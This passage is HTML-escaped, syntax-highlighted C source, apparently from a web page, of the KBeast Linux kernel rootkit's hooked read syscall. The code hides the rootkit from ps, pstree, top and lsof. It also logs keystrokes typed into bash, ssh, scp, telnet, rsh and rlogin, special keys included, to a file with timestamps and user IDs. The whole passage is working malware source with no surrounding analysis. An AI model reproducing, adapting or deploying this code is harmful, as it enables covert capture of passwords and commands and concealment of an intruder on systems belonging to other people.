class=&quot;line&quot;&gt;183&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;184&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;185&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;186&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;187&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;188&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;189&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;190&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;191&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;192&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;193&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;194&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;195&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;196&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;197&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;198&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;199&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;200&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;201&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;202&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;203&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;204&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;205&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;206&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;207&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;208&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;209&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;210&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;211&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;212&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;213&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;214&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;215&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;216&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;217&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;218&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;219&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;220&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;221&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;222&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;223&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;224&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;225&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;226&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;227&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;228&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;229&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;230&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;231&lt;/div&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;div class=&quot;line&quot;&gt;inkage int h4x_read(unsigned int fd, char __user *buf, size_t count)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  int i,r;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  char date_time[24];&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  char *kbuf=(char*)kmalloc(256,GFP_KERNEL);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  /*If output is redirected to file or grep, hide it*/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  copy_from_user(kbuf,buf,255);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; ((strstr(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;ps&quot;&lt;/span&gt;))||(strstr(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;pstree&quot;&lt;/span&gt;))||&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      (strstr(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;top&quot;&lt;/span&gt;))||(strstr(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;lsof&quot;&lt;/span&gt;)))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(strstr(kbuf,_H4X0R_)||strstr(kbuf,KBEAST))&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      kfree(kbuf);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;built_in&quot;&gt;return&lt;/span&gt; -ENOENT;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &amp;#125; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  r=o_read(fd,buf,count);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  /*Due to stability issue, we &lt;span class=&quot;built_in&quot;&gt;limit&lt;/span&gt; the keylogging process*/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;((strcmp(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;bash&quot;&lt;/span&gt;) == 0) || (strcmp(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;ssh&quot;&lt;/span&gt;) == 0)||&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     (strcmp(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;scp&quot;&lt;/span&gt;) == 0) || (strcmp(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;telnet&quot;&lt;/span&gt;) == 0)||&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;     (strcmp(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;rsh&quot;&lt;/span&gt;) == 0) || (strcmp(current-&amp;gt;comm,&lt;span class=&quot;string&quot;&gt;&quot;rlogin&quot;&lt;/span&gt;) == 0))&amp;#123;    &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /*SPECIAL CHAR*/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (counter) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (counter == 2) &amp;#123;  // Arrows + Break&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //left arrow&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x44) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[LEFT]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //right arrow&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x43) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[RIGHT]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //up arrow&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x41) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[UP]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //down arrow&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x42) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[DOWN]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //&lt;span class=&quot;built_in&quot;&gt;break&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x50) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[BREAK]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //numlock&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buf[0] == 0x47) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  strcat (ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[NUMLOCK]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	  counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strncpy (spbuffer,buf,1);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        counter ++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (counter == 3) &amp;#123;   // F1-F5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //F1&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x41) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F1]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //F2&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x42) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F2]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //F3&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x43) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F3]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //F4&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x44) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F4]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        //F5&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x45) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F5]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x7E) &amp;#123;     // PgUp, PgDown, Ins, ...&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //Page Up&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x35)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[PGUP]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //Page Down&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x36)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[PGDN]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //Delete&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x33)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[DELETE]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //End&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x34)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[END]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //Home&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x31)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[HOME]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //Insert&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x32)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[INSERT]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x31) &amp;#123;  // F6-F8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //F6&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x37)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F6]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //F7&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x38)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F7]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //F8&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x39)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F8]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (spbuffer[0] == 0x32) &amp;#123; // F9-F12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //F9&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x30)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F9]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //F10&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x31)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F10]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //F11&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x33)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F11]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          //F12&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x34)&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[F12]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          counter++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(counter &amp;gt;= 4) &amp;#123;  //WatchDog&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      counter ++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    /*SH, SSHD = 0 /TELNETD = 3/LOGIN = 4*/&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(r==1 &amp;amp;&amp;amp; (fd==0||fd==3||fd==4))&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      //CTRL+U&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buf[0]==0x15)&amp;#123; &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        ibuffer[0]=&lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      //TAB&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buf[0]==0x09)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[TAB]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      //CTRL+C&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buf[0]==0x03)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[CTRL+C]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      //CTRL+D&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buf[0]==0x03)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[CTRL+D]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      //CTRL+]&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buf[0]==0x1D)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;[CTRL+]]&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        counter = 0;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      //BACKSPACE 0x7F Local / 0x08 Remote&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x7F || buf[0] == 0x08) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ibuffer[strlen(ibuffer) - 1] == &lt;span class=&quot;string&quot;&gt;&#39;]&#39;&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt; (i=2;strlen(ibuffer);i++)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (ibuffer[strlen (ibuffer) - i] == &lt;span class=&quot;string&quot;&gt;&#39;[&#39;&lt;/span&gt;) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              ibuffer[strlen(ibuffer) - i] = &lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;              &lt;span class=&quot;built_in&quot;&gt;break&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;            &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt; &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          ibuffer[strlen(ibuffer) - 1] = &lt;span class=&quot;string&quot;&gt;&#39;\0&#39;&lt;/span&gt;;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;          goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;  &lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt; (buf[0] == 0x1B) &amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        counter++;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        goto END;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(buf[0] != &lt;span class=&quot;string&quot;&gt;&#39;\n&#39;&lt;/span&gt; &amp;amp;&amp;amp; buf[0] != &lt;span class=&quot;string&quot;&gt;&#39;\r&#39;&lt;/span&gt;)&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strncat(ibuffer,buf,sizeof(ibuffer));&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;      &amp;#125;&lt;span class=&quot;keyword&quot;&gt;else&lt;/span&gt;&amp;#123;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        strcat(ibuffer,&lt;span class=&quot;string&quot;&gt;&quot;\n&quot;&lt;/span&gt;);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        get_time(date_time);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;        snprintf(obuffer,sizeof(obuffer),&lt;span class=&quot;string&quot;&gt;&quot;[%s] - [UID = %i ] %s &amp;gt; %s&quot;&lt;/span&gt;,date_time,current_uid(),current-&amp;gt;comm,ibuffer);&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;	//I don&lt;span class=&quot;string&quot;&gt;&#39;t want to log buffer more than 60 chars, most of them are useless data&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;        if(strlen(ibuffer)&amp;lt;60) &amp;#123;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;          log_to_file(obuffer);&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;        ibuffer[0]=&#39;&lt;/span&gt;\0&lt;span class=&quot;string&quot;&gt;&#39;;&lt;/span&gt;&lt;/div&gt;&lt;div class=&quot;line&quot;&gt;&lt;span class=&quot;string&quot;&gt;      